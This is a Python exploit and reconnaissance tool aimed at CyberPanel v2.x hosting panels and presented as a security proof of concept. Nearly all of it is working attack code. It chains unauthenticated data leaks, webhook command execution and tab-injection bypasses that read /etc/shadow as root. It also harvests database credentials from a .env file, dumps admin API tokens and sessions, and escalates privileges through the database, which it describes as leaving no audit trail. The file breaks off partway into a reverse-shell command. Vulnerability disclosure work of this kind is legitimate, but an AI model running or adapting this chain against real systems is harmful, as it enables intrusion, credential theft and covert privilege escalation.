#!/usr/bin/env python3
"""
CyberPanel v2.x — Security PoC & Recon Tool

Author: Mohd Tajul Asri
Email: espressobyte@gmail.com
Date: 2026-05-17

Subcommands:
    recon         Full automated recon, enumerate, and exploit all findings
    exec          Execute arbitrary command via webhook RCE chain
    info-leak     F3: Unauthenticated API key disclosure
    status-inject F1: Unauthenticated scan status data injection
    file-oracle   F2: Unauthenticated file existence oracle
    file-read     F11: Arbitrary file read as root (API creds required)
    statusfile    F12: CVE-2024-51567 incomplete fix — root file read via tab bypass
    webhook-rce   F8: Store + trigger webhook command (panel login)
    middleware    Probe middleware bypass vectors
    env-leak      Read world-readable .env → extract DB creds + SECRET_KEY
    db-dump       MySQL root via leaked creds → dump admin table + API tokens
    escalate      Stealth escalation: enable API for user → extract token
    revshell      Write reverse shell script via printf octal bypass

Target format: https://host:8090

Requires: Python 3.8+ (stdlib only)

Escalation Chain (Normal User → Root):
    1. Panel login (normal user, no SSH, no API)
    2. Webhook RCE → site user shell (saveGitConfigurations + unauthenticated trigger)
    3. Read /usr/local/CyberCP/.env (world-readable 0644 root:root)
    4. Extract MySQL root password → connect to cyberpanel database
    5. Enable API access for current user via MySQL UPDATE (stealth)
    6. Extract admin API token from loginSystem_administrator table
    7. F11 tab injection → root file read (/etc/shadow, SSH keys, adminPass)
    8. Admin password = root SSH password (CyberPanel default)
"""

import argparse
import http.cookiejar
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Optional

# =============================================================================
# Constants
# =============================================================================

TIMEOUT_SECONDS = 15
USER_AGENT = 'Mozilla/5.0 (compatible; SecurityAudit/1.0)'

ENV_PATH = '/usr/local/CyberCP/.env'
ADMIN_PASS_PATH = '/etc/cyberpanel/adminPass'

COLOR_RED = '\033[91m'
COLOR_GREEN = '\033[92m'
COLOR_YELLOW = '\033[93m'
COLOR_BLUE = '\033[94m'
COLOR_CYAN = '\033[96m'
COLOR_BOLD = '\033[1m'
COLOR_DIM = '\033[2m'
COLOR_RESET = '\033[0m'


# =============================================================================
# HTTP Clients
# =============================================================================

def _ssl_context() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


class APIClient:
    """Stateless HTTP client for API endpoints (no session needed)."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self._ctx = _ssl_context()

    def get(self, path: str, headers: Optional[dict] = None) -> tuple:
        url = f'{self.base_url}{path}'
        req = urllib.request.Request(url, method='GET')
        req.add_header('User-Agent', USER_AGENT)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        start = time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT_SECONDS, context=self._ctx) as resp:
                body = resp.read().decode(errors='replace')
                return resp.status, body, (time.monotonic() - start) * 1000
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors='replace') if e.fp else ''
            return e.code, body, (time.monotonic() - start) * 1000
        except urllib.error.URLError as e:
            return 0, str(e.reason), (time.monotonic() - start) * 1000

    def post_json(self, path: str, data: dict, headers: Optional[dict] = None) -> tuple:
        url = f'{self.base_url}{path}'
        payload = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(url, data=payload, method='POST')
        req.add_header('User-Agent', USER_AGENT)
        req.add_header('Content-Type', 'application/json')
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        start = time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT_SECONDS, context=self._ctx) as resp:
                body = resp.read().decode(errors='replace')
                return resp.status, body, (time.monotonic() - start) * 1000
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors='replace') if e.fp else ''
            return e.code, body, (time.monotonic() - start) * 1000
        except urllib.error.URLError as e:
            return 0, str(e.reason), (time.monotonic() - start) * 1000


class PanelSession:
    """Authenticated session client for CyberPanel web panel."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self._ctx = _ssl_context()
        self._cj = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self._cj),
            urllib.request.HTTPSHandler(context=self._ctx),
        )
        self._csrf_token = None
        self.user_id = None

    def _refresh_csrf(self):
        for cookie in self._cj:
            if cookie.name == 'csrftoken':
                self._csrf_token = cookie.value
                return

    def login(self, username: str, password: str) -> bool:
        """Login to CyberPanel panel. Returns True on success."""
        self._opener.open(self.base_url, timeout=TIMEOUT_SECONDS)
        self._refresh_csrf()

        login_data = json.dumps({
            'username': username,
            'password': password,
            'languageSelection': 'english',
        }).encode()

        req = urllib.request.Request(
            f'{self.base_url}/verifyLogin',
            data=login_data,
            headers={
                'Content-Type': 'application/json',
                'Referer': f'{self.base_url}/',
                'X-CSRFToken': self._csrf_token or '',
            },
        )

        try:
            resp = self._opener.open(req, timeout=TIMEOUT_SECONDS)
            body = json.loads(resp.read().decode())
            self._refresh_csrf()
            if body.get('loginStatus') == 1:
                self.user_id = body.get('userID')
                return True
        except Exception:
            pass
        return False

    def post_json(self, path: str, data: dict) -> tuple:
        """POST JSON to a panel endpoint using the authenticated session."""
        url = f'{self.base_url}{path}'
        payload = json.dumps(data).encode('utf-8')

        req = urllib.request.Request(
            url,
            data=payload,
            headers={
                'Content-Type': 'application/json',
                'Referer': f'{self.base_url}/',
                'X-CSRFToken': self._csrf_token or '',
            },
        )

        try:
            resp = self._opener.open(req, timeout=TIMEOUT_SECONDS)
            body = resp.read().decode(errors='replace')
            return resp.status, body, None
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors='replace') if e.fp else ''
            return e.code, body, None
        except urllib.error.URLError as e:
            return 0, str(e.reason), None


# =============================================================================
# Result Printer
# =============================================================================

def banner():
    print(f'{COLOR_BOLD}')
    print('=' * 70)
    print(' CyberPanel v2.x — Security PoC & Recon Tool')
    print(' Author: Mohd Tajul Asri <espressobyte@gmail.com>')
    print('=' * 70)
    print(f'{COLOR_RESET}')


def ok(msg: str):
    print(f'  {COLOR_GREEN}[+]{COLOR_RESET} {msg}')


def fail(msg: str):
    print(f'  {COLOR_RED}[-]{COLOR_RESET} {msg}')


def info(msg: str):
    print(f'  {COLOR_BLUE}[*]{COLOR_RESET} {msg}')


def warn(msg: str):
    print(f'  {COLOR_YELLOW}[!]{COLOR_RESET} {msg}')


def header(msg: str):
    print(f'\n{COLOR_BOLD}{COLOR_CYAN}--- {msg} ---{COLOR_RESET}')


def detail(msg: str):
    print(f'      {COLOR_DIM}{msg}{COLOR_RESET}')


# =============================================================================
# Finding: F3 — API Key Information Disclosure (Unauthenticated)
# =============================================================================

def check_f3_info_leak(client: APIClient) -> dict:
    """GET /api/ai-scanner/list-api-keys — no auth required."""
    header('F3: API Key Information Disclosure')
    info('GET /api/ai-scanner/list-api-keys')

    status, body, elapsed = client.get('/api/ai-scanner/list-api-keys')

    if status == 200:
        try:
            data = json.loads(body)
            keys = data.get('api_keys', [])
            scans = data.get('recent_scans', [])
            if keys or scans:
                ok(f'Leaked {len(keys)} API key(s), {len(scans)} scan(s) — NO AUTH')
                for k in keys:
                    detail(f"Admin: {k.get('admin')}, Key prefix: {k.get('api_key_prefix')}, "
                           f"Balance: {k.get('balance')}")
                return {'vulnerable': True, 'keys': keys, 'scans': scans}
            else:
                ok('Endpoint accessible but no keys/scans returned.')
                return {'vulnerable': True, 'keys': [], 'scans': []}
        except json.JSONDecodeError:
            pass

    if status == 404:
        fail('Endpoint not found (404) — ai-scanner module not installed.')
    else:
        fail(f'HTTP {status} ({elapsed:.0f}ms)')

    return {'vulnerable': False}


# =============================================================================
# Finding: F1 — Status Webhook Data Injection (Unauthenticated)
# =============================================================================

def check_f1_status_inject(client: APIClient) -> dict:
    """POST /api/ai-scanner/status-webhook — no auth required."""
    header('F1: Status Webhook Data Injection')
    info('POST /api/ai-scanner/status-webhook')

    payload = {
        'scan_id': 'poc-inject-001',
        'phase': 'completed',
        'progress': 100,
        'threats_found': 999,
        'current_file': '/etc/shadow',
        'message': 'SECURITY_TEST_INJECTION',
    }

    status, body, elapsed = client.post_json('/api/ai-scanner/status-webhook', payload)

    if status == 200:
        try:
            data = json.loads(body)
            if data.get('success') is True:
                ok('Forged scan status accepted — NO AUTH')
                detail('Injected scan_id=poc-inject-001 with threats_found=999')
                return {'vulnerable': True}
        except json.JSONDecodeError:
            pass
    if status == 404:
        fail('Endpoint not found (404).')
    else:
        fail(f'HTTP {status} ({elapsed:.0f}ms): {body[:150]}')

    return {'vulnerable': False}


# =============================================================================
# Finding: F2 — File Existence Oracle (Unauthenticated)
# =============================================================================

def check_f2_file_oracle(client: APIClient, filepath: str = '/etc/passwd') -> dict:
    """POST /api/runAWSBackups — no auth required."""
    header('F2: File Existence Oracle')
    info(f'POST /api/runAWSBackups — testing: {filepath}')

    status_real, body_real, elapsed_real = client.post_json(
        '/api/runAWSBackups', {'randomFile': filepath}
    )
    status_fake, body_fake, elapsed_fake = client.post_json(
        '/api/runAWSBackups', {'randomFile': '/tmp/__nonexistent_xyzzy_probe__'}
    )

    if status_real in (200, 500) and status_fake in (200, 500):
        timing_delta = abs(elapsed_real - elapsed_fake)
        response_diff = body_real != body_fake

        ok(f'Endpoint accepts arbitrary paths — NO AUTH')
        detail(f'Target ({filepath}): HTTP {status_real}, {elapsed_real:.0f}ms')
        detail(f'Control (nonexistent): HTTP {status_fake}, {elapsed_fake:.0f}ms')
        detail(f'Timing delta: {timing_delta:.0f}ms | Response differs: {response_diff}')
        return {
            'vulnerable': True,
            'timing_delta': timing_delta,
            'response_diff': response_diff,
        }

    if status_real == 404:
        fail('Endpoint not found (404).')
    else:
        fail(f'HTTP {status_real} ({elapsed_real:.0f}ms)')

    return {'vulnerable': False}


# =============================================================================
# Finding: F8 — Webhook Stored Command Execution (Unauthenticated trigger)
# =============================================================================

def check_f8_webhook_trigger(client: APIClient, domain: str) -> dict:
    """POST /websites/<domain>/webhook — no auth required."""
    header('F8: Webhook Trigger (Unauthenticated)')
    info(f'POST /websites/{domain}/webhook')

    status, body, elapsed = client.post_json(f'/websites/{domain}/webhook', {})

    if status == 200:
        try:
            data = json.loads(body)
            cmd_status = data.get('commandStatus', '')
            ok(f'Webhook triggered — NO AUTH')
            detail(f'Git output: {cmd_status.strip()[:120]}')
            return {'vulnerable': True, 'commandStatus': cmd_status}
        except json.JSONDecodeError:
            pass
    if status == 500:
        ok(f'Endpoint reached (500) — domain exists, no git config')
        return {'vulnerable': True}

    if status == 404:
        fail('Endpoint or domain not found (404).')
    else:
        fail(f'HTTP {status} ({elapsed:.0f}ms)')

    return {'vulnerable': False}


# =============================================================================
# Finding: F11 — Arbitrary File Read as Root (API creds)
#
# Tab injection in dir field of FetchRemoteTransferStatus.
# The endpoint runs: cat /home/cyberpanel/<dir>/transfer_log
# With dir="\t/etc/shadow\t", cat splits args and reads the injected path.
# Runs as root via outputExecutioner(shell=True).
#
# Auth fields: adminUser + adminPass (for admin API token)
#              OR username + password (for normal user API token)
# No ACL check — any user with api=1 can read arbitrary files as root.
# =============================================================================

def check_f11_file_read(client: APIClient, username: str, password: str,
                        target_path: str = '/etc/passwd') -> dict:
    """
    POST /api/FetchRemoteTransferStatus — tab injection in dir field.
    cat runs as root via outputExecutioner(shell=True).
    """
    header('F11: Arbitrary File Read (Root)')
    info(f'POST /api/FetchRemoteTransferStatus — reading: {target_path}')

    # Proven payload: tab prefix causes cat to split arguments
    injected_dir = f'\t{target_path}\t'
    payload = {
        'adminUser': username,
        'adminPass': password,
        'username': username,
        'password': password,
        'dir': injected_dir,
    }

    status, body, elapsed = client.post_json('/api/FetchRemoteTransferStatus', payload)

    if status == 200:
        try:
            data = json.loads(body)
            output = data.get('status', '')
            lines = [l for l in output.split('\n')
                     if 'No such file or directory' not in l and l.strip()]
            if lines:
                ok(f'Read {target_path} as root — {len(lines)} lines')
                for line in lines[:8]:
                    detail(line)
                if len(lines) > 8:
                    detail(f'... ({len(lines) - 8} more lines)')
                return {'vulnerable': True, 'lines': lines}
            else:
                fail(f'No content returned for {target_path}')
        except json.JSONDecodeError:
            pass

    if status == 403:
        fail('API access disabled or bad credentials.')
    elif status == 404:
        fail('Endpoint not found (404).')
    else:
        fail(f'HTTP {status} ({elapsed:.0f}ms)')

    return {'vulnerable': False}


# =============================================================================
# Finding: F12 — CVE-2024-51567 Incomplete Fix (statusfile tab injection)
#
# upgrademysqlstatus, dns/getresetstatus, ftp/getresetstatus all run:
#     sudo cat " + statusfile       (outputExecutioner, shell=True, runs as root)
#     sudo rm -f " + statusfile     (executioner, shell=True, runs as root)
#
# CVE-2024-51567 originally allowed RCE via ; in statusfile.
# Fix: secMiddleware now blocks ; $ ` | && but NOT tab (\t).
# Tab bypass: statusfile="/dev/null\t/etc/shadow" → cat reads both files as root.
#
# Auth: admin panel session required (currentACL['admin'] == 1)
# Impact: root file read (not RCE — all command separators blocked)
# =============================================================================

STATUSFILE_ENDPOINTS = [
    ('/dataBases/upgrademysqlstatus', 'databases/views.py:519'),
    ('/dns/getresetstatus', 'dns/views.py:260'),
    ('/ftp/getresetstatus', 'ftp/views.py:157'),
]


def check_f12_statusfile(session: PanelSession, target_path: str = '/etc/shadow') -> dict:
    """
    Test CVE-2024-51567 incomplete fix: tab injection in statusfile field.
    sudo cat /dev/null\\t<target> reads arbitrary files as root.
    Requires admin panel session.
    """
    header('F12: CVE-2024-51567 Incomplete Fix (statusfile)')
    info(f'Testing tab injection in statusfile — reading: {target_path}')
    info(f'Original CVE used ; for RCE — now blocked by middleware')
    info(f'Tab (\\t) bypasses middleware → root file read via cat argument splitting')

    results_by_endpoint = {}

    for endpoint, source_ref in STATUSFILE_ENDPOINTS:
        info(f'POST {endpoint} (source: {source_ref})')

        payload = {'statusfile': f'/dev/null\t{target_path}'}
        status, body, _ = session.post_json(endpoint, payload)

        try:
            data = json.loads(body)
            request_status = data.get('requestStatus', '')
            error_msg = data.get('error_message', '')

            if 'not accepted' in str(error_msg).lower():
                fail(f'{endpoint}: middleware blocked')
                results_by_endpoint[endpoint] = {'blocked': True}
                continue

            # Filter out "No such file or directory" for /dev/null noise
            lines = [l for l in request_status.split('\n')
                     if l.strip() and 'No such file or directory' not in l]

            if lines:
                ok(f'{endpoint}: read {target_path} as root — {len(lines)} lines')
                for line in lines[:5]:
                    detail(line)
                if len(lines) > 5:
                    detail(f'... ({len(lines) - 5} more lines)')
                results_by_endpoint[endpoint] = {'vulnerable': True, 'lines': lines}
            else:
                fail(f'{endpoint}: no content returned')
                results_by_endpoint[endpoint] = {'vulnerable': False}

        except json.JSONDecodeError:
            fail(f'{endpoint}: invalid response')
            results_by_endpoint[endpoint] = {'vulnerable': False}

    vuln_count = sum(1 for v in results_by_endpoint.values() if v.get('vulnerable'))
    if vuln_count > 0:
        ok(f'{vuln_count}/{len(STATUSFILE_ENDPOINTS)} endpoints vulnerable to tab bypass')
        warn('Underlying injection NOT fixed — middleware-only mitigation')
        return {'vulnerable': True, 'endpoints': results_by_endpoint}

    fail('No endpoints vulnerable')
    return {'vulnerable': False}


def cmd_statusfile(args):
    """Test CVE-2024-51567 incomplete fix with admin credentials."""
    header('F12: CVE-2024-51567 Statusfile Tab Injection')
    info(f'Target: {args.target}')
    info(f'Reading: {args.file}')

    session = PanelSession(args.target)

    info(f'Logging in as {args.admin_user}...')
    if not session.login(args.admin_user, args.admin_password):
        fail('Login failed (admin session required).')
        return False

    ok(f'Authenticated (userID={session.user_id})')

    result = check_f12_statusfile(session, args.file)

    if result.get('vulnerable'):
        print(f'\n  {COLOR_YELLOW}CVE-2024-51567 incomplete fix confirmed:{COLOR_RESET}')
        print(f'    - Middleware blocks: ; $ ` | && || ( ) [ ] {{ }} : < > &')
        print(f'    - Middleware allows: \\t (tab)')
        print(f'    - "sudo cat " + statusfile → tab splits cat arguments')
        print(f'    - Root file read on all 3 endpoints')
        print(f'    - Fix required: input validation, not just blocklist')

    return result.get('vulnerable', False)


# =============================================================================
# Middleware Bypass Probe
#
# CyberPanel secMiddleware.py has two blocklists:
#   Non-API (panel endpoints):
#       - -, \n, ;, &&, |, ..., `, $, (, ), ', [, ], {, }, :, <, >, &
#   API endpoints (isAPIEndpoint=True):
#       - -, \n, ;, &&, ||, |, ..., `, $, ../, ../../
#       API does NOT block: ' ( ) [ ] { } : < > &
#
# CRITICAL: saveGitConfigurations passes >, <, & through even though
# they're on the non-API blocklist — likely a code path issue.
# This enables writing arbitrary file content via printf octal escapes.
# =============================================================================

def check_middleware_bypass(client: APIClient) -> dict:
    """Test which characters pass through secMiddleware."""
    header('MW: Middleware Character Filter Bypass')
    info('Testing bypass vectors on /api/remoteTransfer')
    info('API blocklist: - -, \\n, ;, &&, ||, |, ..., `, $, ../, ../../')
    info('API allows: \' ( ) [ ] { } : < > &')

    test_vectors = [
        ("Tab (\\t)",     'ipAddress', '127.0.0.1\t--flag'),
        ("Newline (\\n)", 'ipAddress', '127.0.0.1\n--flag'),
        ("Semicolon (;)", 'ipAddress', '127.0.0.1;id'),
        ("Single-quote (')", 'ruleIP', "10.0.0.1' --help '"),
        ("Ampersand (&)", 'ipAddress', '127.0.0.1 & id'),
        ("Redirect (>)", 'ipAddress', '127.0.0.1 > /tmp/x'),
    ]

    passed = []
    blocked = []

    for label, inject_key, inject_val in test_vectors:
        payload = {
            'adminUser': 'admin', 'adminPass': 'x',
            'ruleName': 'probe', 'ruleProtocol': 'tcp',
            'rulePort': '80', 'ruleIP': '10.0.0.1',
            'username': 'admin', 'password': 'x',
            'ipAddress': '127.0.0.1',
            'accountsToTransfer': ['t'], 'port': '22',
        }
        payload[inject_key] = inject_val

        status, body, _ = client.post_json('/api/remoteTransfer', payload)
        is_blocked = (status == 403 or 'not accepted' in body.lower()
                      or 'not allowed' in body.lower())
        if is_blocked:
            blocked.append(label)
            detail(f'{label}: BLOCKED (HTTP {status})')
        else:
            passed.append(label)
            detail(f'{label}: PASSED (HTTP {status})')

    if passed and blocked:
        ok(f'{len(passed)} bypass(es) found, {len(blocked)} blocked')
        return {'vulnerable': True, 'passed': passed, 'blocked': blocked}
    elif not blocked:
        warn('Nothing blocked — middleware may be disabled')
        return {'vulnerable': True, 'passed': passed, 'blocked': []}
    else:
        fail('All test vectors blocked')
        return {'vulnerable': False, 'passed': [], 'blocked': blocked}


# =============================================================================
# Webhook RCE Chain — Store + Trigger + Read Result
# =============================================================================

def webhook_store_command(session: PanelSession, domain: str, command: str) -> bool:
    """Store a shell command in git webhook config for a domain."""
    payload = {
        'domain': domain,
        'folder': f'/home/{domain}/public_html',
        'autoCommit': 'Never',
        'webhookCommand': True,
        'commands': command,
    }

    status, body, _ = session.post_json('/websites/saveGitConfigurations', payload)

    try:
        data = json.loads(body)
        return data.get('status') == 1
    except (json.JSONDecodeError, TypeError):
        return False


def webhook_trigger(client: APIClient, domain: str) -> Optional[str]:
    """Trigger the unauthenticated webhook. Returns commandStatus or None."""
    status, body, _ = client.post_json(f'/websites/{domain}/webhook', {})

    if status == 200:
        try:
            data = json.loads(body)
            return data.get('commandStatus', '')
        except json.JSONDecodeError:
            pass
    return None


def webhook_read_logs(session: PanelSession, domain: str, count: int = 50) -> list:
    """Fetch git logs containing command execution results."""
    payload = {
        'domain': domain,
        'folder': f'/home/{domain}/public_html',
        'recordsToShow': count,
        'page': 1,
    }

    status, body, _ = session.post_json('/websites/fetchGitLogs', payload)

    try:
        data = json.loads(body)
        if data.get('status') == 1:
            return json.loads(data.get('logs', '[]'))
    except (json.JSONDecodeError, TypeError):
        pass
    return []


def parse_latest_execution(logs: list) -> list:
    """
    Extract the most recent command execution batch from git logs.

    Logs are in reverse chronological order (newest first).
    A batch looks like:
      Finished running commands.
      Result: <output>
      Running: <cmd>
      Running commands after successful git commit..
      [Webhook Fired] ...

    Returns list of dicts: [{'command': ..., 'result': ...}, ...]
    """
    batch = []
    in_batch = False

    for entry in logs:
        msg = entry.get('message', '')

        if 'Finished running commands' in msg:
            in_batch = True
            continue

        if in_batch:
            if msg.startswith('[Webhook Fired]'):
                break
            batch.append(msg)

    batch.reverse()

    pairs = []
    i = 0
    while i < len(batch):
        msg = batch[i]
        if msg.startswith('Running commands after'):
            i += 1
            continue
        if msg.startswith('Running: '):
            cmd = msg[9:]
            result = ''
            if i + 1 < len(batch) and batch[i + 1].startswith('Result: '):
                result = batch[i + 1][8:]
                i += 2
            else:
                i += 1
            pairs.append({'command': cmd, 'result': result})
        else:
            i += 1

    return pairs


def webhook_exec(session: PanelSession, client: APIClient,
                 domain: str, command: str) -> Optional[str]:
    """
    Full chain: store command → trigger webhook → read result from logs.
    Returns command output or None on failure.
    """
    if not webhook_store_command(session, domain, command):
        return None

    trigger_result = webhook_trigger(client, domain)
    if trigger_result is None:
        return None

    time.sleep(1)

    logs = webhook_read_logs(session, domain)
    pairs = parse_latest_execution(logs)

    if pairs:
        return '\n'.join(p['result'] for p in pairs if p['result'])

    return None


# =============================================================================
# .env Credential Leak — Read world-readable .env file
#
# /usr/local/CyberCP/.env is 0644 root:root by default.
# Contains: SECRET_KEY, DB_PASSWORD, ROOT_DB_PASSWORD
# Any site user (via webhook RCE) can read it.
# =============================================================================

def _parse_env_content(content: str) -> dict:
    """Parse KEY=VALUE pairs from .env file content."""
    env_vars = {}
    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if '=' in line:
            key, _, value = line.partition('=')
            env_vars[key.strip()] = value.strip()
    return env_vars


def cmd_env_leak(args):
    """Read .env via webhook RCE → extract DB creds and SECRET_KEY."""
    header('ENV Leak: World-Readable .env Credential Harvest')
    info(f'Target: {args.target}')
    info(f'Domain: {args.domain}')
    info(f'Path: {ENV_PATH}')

    session = PanelSession(args.target)
    client = APIClient(args.target)

    info(f'Logging in as {args.user}...')
    if not session.login(args.user, args.password):
        fail('Login failed.')
        return False

    ok(f'Authenticated (userID={session.user_id})')

    info(f'Reading {ENV_PATH} via webhook RCE...')
    result = webhook_exec(session, client, args.domain, f'cat {ENV_PATH}')

    if not result:
        fail('Failed to read .env — command returned no output')
        return False

    env_vars = _parse_env_content(result)

    if not env_vars:
        fail('No variables parsed from .env content')
        detail(f'Raw output: {result[:200]}')
        return False

    ok(f'Extracted {len(env_vars)} variable(s) from .env')

    sensitive_keys = ['SECRET_KEY', 'DB_PASSWORD', 'ROOT_DB_PASSWORD',
                      'DB_USER', 'DB_NAME', 'DB_HOST']
    for key in sensitive_keys:
        if key in env_vars:
            value = env_vars[key]
            if 'PASSWORD' in key or 'SECRET' in key:
                display = f'{value[:4]}...{value[-4:]}' if len(value) > 8 else '***'
            else:
                display = value
            detail(f'{key} = {display}')

    print(f'\n  {COLOR_BOLD}=== Full .env Content ==={COLOR_RESET}')
    for line in result.split('\n'):
        if line.strip():
            print(f'  {line}')
    print(f'  {COLOR_BOLD}=== End ==={COLOR_RESET}')

    warn('DB_PASSWORD = ROOT_DB_PASSWORD (same credential)')
    warn('MySQL root access available from site user context')

    return True


# =============================================================================
# Database Dump — MySQL root via leaked .env credentials
#
# After reading .env, use ROOT_DB_PASSWORD to connect as MySQL root.
# Dump loginSystem_administrator (users, types, API tokens).
# Dump django_session (active sessions).
# =============================================================================

def cmd_db_dump(args):
    """Connect to MySQL with leaked creds → dump admin table + sessions."""
    header('DB Dump: MySQL Root via Leaked Credentials')
    info(f'Target: {args.target}')
    info(f'Domain: {args.domain}')

    session = PanelSession(args.target)
    client = APIClient(args.target)

    info(f'Logging in as {args.user}...')
    if not session.login(args.user, args.password):
        fail('Login failed.')
        return False

    ok(f'Authenticated (userID={session.user_id})')

    # Step 1: Read .env to get DB password
    if args.db_password:
        db_pass = args.db_password
        info(f'Using provided DB password')
    else:
        info(f'Reading {ENV_PATH} for DB credentials...')
        env_result = webhook_exec(session, client, args.domain, f'cat {ENV_PATH}')
        if not env_result:
            fail('Failed to read .env')
            return False

        env_vars = _parse_env_content(env_result)
        db_pass = env_vars.get('ROOT_DB_PASSWORD') or env_vars.get('DB_PASSWORD')
        if not db_pass:
            fail('No DB password found in .env')
            return False
        ok(f'Extracted ROOT_DB_PASSWORD from .env')

    # Step 2: Dump administrator table
    header('Dumping loginSystem_administrator')
    mysql_cmd = (
        f'mysql -u root -p{db_pass} cyberpanel -e '
        '"SELECT id,userName,firstName,email,type,api,token '
        'FROM loginSystem_administrator"'
    )
    admin_result = webhook_exec(session, client, args.domain, mysql_cmd)

    if admin_result:
        ok('Administrator table dumped')
        print(f'\n  {COLOR_BOLD}=== Admin Users ==={COLOR_RESET}')
        for line in admin_result.split('\n'):
            if line.strip():
                print(f'  {line}')
        print(f'  {COLOR_BOLD}=== End ==={COLOR_RESET}')
    else:
        fail('Failed to dump administrator table')

    # Step 3: Dump active sessions
    header('Dumping django_session (active sessions)')
    session_cmd = (
        f'mysql -u root -p{db_pass} cyberpanel -e '
        '"SELECT session_key,expire_date FROM django_session '
        'ORDER BY expire_date DESC LIMIT 10"'
    )
    session_result = webhook_exec(session, client, args.domain, session_cmd)

    if session_result:
        ok('Session table dumped')
        for line in session_result.split('\n'):
            if line.strip():
                detail(line)
    else:
        fail('Failed to dump session table')

    # Step 4: Extract admin API token specifically
    header('Extracting Admin API Token')
    token_cmd = (
        f'mysql -u root -p{db_pass} cyberpanel -e '
        '"SELECT userName,token FROM loginSystem_administrator '
        'WHERE type=1 LIMIT 1"'
    )
    token_result = webhook_exec(session, client, args.domain, token_cmd)

    if token_result:
        lines = [l for l in token_result.split('\n') if l.strip()]
        for line in lines:
            if 'Basic' in line or 'token' not in line.lower():
                parts = line.split('\t')
                if len(parts) >= 2:
                    ok(f'Admin API token: {parts[0].strip()} → {parts[1].strip()[:40]}...')
    else:
        fail('Failed to extract admin token')

    return True


# =============================================================================
# Stealth Escalation — Enable API for normal user + extract token
#
# Normal users have api=0 by default (no API access).
# Via MySQL root (from .env leak), UPDATE to api=1.
# This is invisible in the panel UI — no log, no audit trail.
# The user's token was generated at account creation and stored in DB.
# =============================================================================

def cmd_escalate(args):
    """Enable API for current user via MySQL → extract API token."""
    header('Stealth Escalation: Normal User → API Access')
    info(f'Target: {args.target}')
    info(f'Domain: {args.domain}')
    info(f'Escalating user: {args.user}')

    session = PanelSession(args.target)
    client = APIClient(args.target)

    info(f'Logging in as {args.user}...')
    if not session.login(args.user, args.password):
        fail('Login failed.')
        return False

    ok(f'Authenticated (userID={session.user_id})')

    # Step 1: Get DB password
    if args.db_password:
        db_pass = args.db_password
    else:
        info(f'Reading {ENV_PATH}...')
        env_result = webhook_exec(session, client, args.domain, f'cat {ENV_PATH}')
        if not env_result:
            fail('Failed to read .env')
            return False
        env_vars = _parse_env_content(env_result)
        db_pass = env_vars.get('ROOT_DB_PASSWORD') or env_vars.get('DB_PASSWORD')
        if not db_pass:
            fail('No DB password in .env')
            return False
        ok('Got ROOT_DB_PASSWORD')

    # Step 2: Check current API status
    info(f'Checking current API status for {args.user}...')
    check_cmd = (
        f'mysql -u root -p{db_pass} cyberpanel -e '
        f'"SELECT userName,api,token FROM loginSystem_administrator '
        f'WHERE userName=\'{args.user}\'"'
    )
    check_result = webhook_exec(session, client, args.domain, check_cmd)

    if check_result:
        detail(f'Current state: {check_result.strip()}')

    # Step 3: Enable API
    info(f'Enabling API access (UPDATE api=1)...')
    enable_cmd = (
        f'mysql -u root -p{db_pass} cyberpanel -e '
        f'"UPDATE loginSystem_administrator SET api=1 '
        f'WHERE userName=\'{args.user}\'"'
    )
    enable_result = webhook_exec(session, client, args.domain, enable_cmd)
    ok(f'API enabled for {args.user} (stealth — invisible in panel UI)')

    # Step 4: Extract token
    info('Extracting API token...')
    token_cmd = (
        f'mysql -u root -p{db_pass} cyberpanel -e '
        f'"SELECT token FROM loginSystem_administrator '
        f'WHERE userName=\'{args.user}\'"'
    )
    token_result = webhook_exec(session, client, args.domain, token_cmd)

    if token_result:
        lines = [l for l in token_result.split('\n')
                 if l.strip() and 'token' not in l.lower()]
        if lines:
            token = lines[0].strip()
            ok(f'API Token: {token}')
            print(f'\n  {COLOR_BOLD}=== Escalation Complete ==={COLOR_RESET}')
            print(f'  User {args.user} now has API access')
            print(f'  Token: {token}')
            print(f'  Use with: --api-user {args.user} --api-pass {token}')
            print(f'  F11 file read: python3 cp_poc.py file-read <target> '
                  f'--api-user {args.user} --api-pass {token} -f /etc/shadow')
            print(f'  {COLOR_BOLD}=== End ==={COLOR_RESET}')
    else:
        fail('Failed to extract token')

    # Step 5: Also extract admin token
    header('Bonus: Admin API Token')
    admin_token_cmd = (
        f'mysql -u root -p{db_pass} cyberpanel -e '
        f'"SELECT userName,token FROM loginSystem_administrator WHERE type=1"'
    )
    admin_result = webhook_exec(session, client, args.domain, admin_token_cmd)

    if admin_result:
        lines = [l for l in admin_result.split('\n')
                 if l.strip() and 'token' not in l.lower() and 'userName' not in l]
        for line in lines:
            parts = line.split('\t')
            if len(parts) >= 2:
                ok(f'Admin: {parts[0].strip()} → {parts[1].strip()[:50]}...')
                detail('Admin token enables F11 root file read on ANY file')

    return True


# =============================================================================
# Reverse Shell — Write + optionally trigger reverse shell
#
# Middleware bypass: saveGitConfigurations passes >, <, & through
# despite them being on the non-API blocklist.
# printf with octal escapes (\046 for &) writes arbitrary content.
# Shell runs as website system user (not root).
# =============================================================================

def cmd_revshell(args):
    """Write reverse shell script via printf octal bypass → trigger."""
    header('Reverse Shell: Middleware Bypass via Octal Escapes')
    info(f'Target: {args.target}')
    info(f'Domain: {args.domain}')
    info(f'Callback: {args.lhost}:{args.lport}')
    info(f'Script path: {args.script_path}')

    session = PanelSession(args.target)
    client = APIClient(args.target)

    info(f'Logging in as {args.user}...')
    if not session.login(args.user, args.password):
        fail('Login failed.')
        return False

    ok(f'Authenticated (userID={session.user_id})')

